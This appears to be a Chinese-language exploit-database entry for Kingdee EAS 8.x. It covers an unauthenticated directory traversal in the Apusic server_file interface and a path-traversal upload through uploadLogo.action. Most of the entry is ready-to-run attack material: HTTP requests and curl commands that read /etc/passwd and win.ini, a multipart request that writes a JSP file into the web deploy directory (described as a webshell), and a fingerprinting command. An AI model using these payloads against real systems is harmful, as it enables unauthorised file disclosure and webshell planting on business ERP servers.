---
id: KINGDEE-EAS-TRAVERSAL
title: 金蝶EAS Apusic server_file 目录遍历/uploadLogo 文件上传
product: kingdee
vendor: 金蝶软件
version_affected: "EAS 8.x"
severity: HIGH
tags: [file_read, file_upload, path_traversal, 国产, erp, 无需认证]
fingerprint: ["金蝶", "Kingdee", "EAS", "Apusic", "server_file", "uploadLogo"]
---

## 漏洞描述

金蝶EAS 的 Apusic 中间件 server_file 接口存在目录遍历漏洞，可读取任意文件。同时 uploadLogo.action 接口存在路径穿越文件上传。

## 影响版本

- EAS 8.x

## 前置条件

- 无需认证，目标开放 `/easportal/tools/Apusic/server_file` 或 `/eassso/uploadLogo.action` 接口

## 利用步骤

### Apusic server_file 目录遍历

```http
GET /easportal/tools/Apusic/server_file?path=../../../../../../etc/passwd HTTP/1.1
Host: target
```

```http
GET /easportal/tools/Apusic/server_file?path=../../../../../../C:/Windows/win.ini HTTP/1.1
Host: target
```

### uploadLogo.action 文件上传

```http
POST /eassso/uploadLogo.action HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../server/default/deploy/easportal.war/test.jsp"
Content-Type: application/octet-stream

<%out.print("vuln_test");%>
------WebKitFormBoundary--
```

通过路径穿越将 webshell 写入 web 目录。

## Payload

目录遍历读取文件（Linux）：

```bash
curl -s "http://target/easportal/tools/Apusic/server_file?path=../../../../../../etc/passwd"
```

目录遍历读取文件（Windows）：

```bash
curl -s "http://target/easportal/tools/Apusic/server_file?path=../../../../../../C:/Windows/win.ini"
```

uploadLogo 文件上传：

```bash
curl -X POST "http://target/eassso/uploadLogo.action" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@test.jsp;filename=../../server/default/deploy/easportal.war/test.jsp"
```

## 验证方法

目录遍历响应中包含文件内容；文件上传后访问确认。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/easportal/tools/Apusic/server_file"
```
